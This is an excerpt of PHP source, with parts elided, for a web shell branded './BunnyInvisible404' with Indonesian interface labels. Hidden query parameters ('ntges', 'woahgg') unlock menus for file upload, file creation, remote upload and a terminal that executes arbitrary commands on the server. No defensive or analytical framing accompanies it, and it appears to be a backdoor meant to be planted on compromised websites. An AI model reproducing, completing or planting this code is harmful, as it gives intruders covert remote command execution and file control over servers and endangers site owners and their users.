...
if (isset($_GET['ntges'])) {
    if (isset($_GET['woahgg'])) {
        ...
        <body>
            <div class="root"><div class="mb-4"><a href="?ntges&woahgg"><button type="button" class="btn btn-outline-light">Home</button></a><a href="?ntges&woahgg&file"><button type="button" class="btn btn-outline-light">Buat File</button></a><a href="?ntges&woahgg&remote"><button type="button" class="btn btn-outline-light">Remote Upload</button></a><a href="?ntges&woahgg&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a></div><h1>./BunnyInvisible404</h1><form action="" method="post" enctype="multipart/form-data"><div class="mb-3" style="display: flex; justify-content: center; align-items: center;"><label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label><input type="file" name="file[]" id="file" onchange="this.form.submit()" multiple></div>';
        ...
        if (isset($_GET['file'])) {
            echo '
                    <div class="mb-3"><label for="namafile" class="form-label">Buat File</label><input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file"><textarea class="form-control form-control-sm mt-3" name="isifile" cols="80" rows="20" placeholder="isi file" id="isifile"></textarea><div class="mt-3 d-grid gap-2"><input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File"></div></div>
                    ';
        }
        '</form>';
        ?>
        ...
        ?>
            <div class="terminal">
                <div class="terminal-header"><img class="terminal-img" src="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/Bunny-Terminal.png" alt="terminal"><span class="font-bold font-black">Terminal</span></div><textarea class="terminal-content" id="terminalContent" readonly>
<?php if (isset($_POST['exe'])) {
                $komendnya = htmlspecialchars($_POST['komend']);
                htmlspecialchars(komend($komendnya, $path));
            } ?></textarea>
                <div class="terminal-input">
                    <form action="" method="POST" enctype="multipart/form-data"><span class="prompt">
                        ...
                        </span><input type="text" name="komend" id="terminalInput" class="terminalInput" autofocus autocomplete="off"><input type="submit" name="exe" style="display: none;"></form>
                </div>
            </div>
            </div>
            </body>
